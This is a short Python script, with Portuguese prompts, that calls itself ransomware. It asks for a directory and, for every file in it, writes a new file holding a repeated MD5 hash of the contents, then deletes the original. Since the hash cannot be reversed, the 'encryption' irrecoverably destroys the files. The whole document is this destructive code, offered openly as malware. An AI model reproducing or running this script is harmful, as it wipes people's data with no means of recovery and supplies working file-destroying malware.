import hashlib
import os

função = str(input("Bem Vindo ao Ransomware. Digite o que você deseja fazer: "))
if função == 'criptografar': 
    diretorio = str(input("Digite o caminho do diretório que você quer criptografar: "))
    for files in os.listdir(diretorio):
        os.chdir(diretorio)
        with open (files, 'rb') as rb:
            dados = rb.read()
            criptografar = hashlib.md5(dados).hexdigest()
            novo_arquivo= '(criptografado) '+ os.path.basename(files)
            with open(novo_arquivo, 'wb') as novo:
                novo.write(criptografar.encode()*0xFF)
                novo.close()
                rb.close()

                os.remove(files)
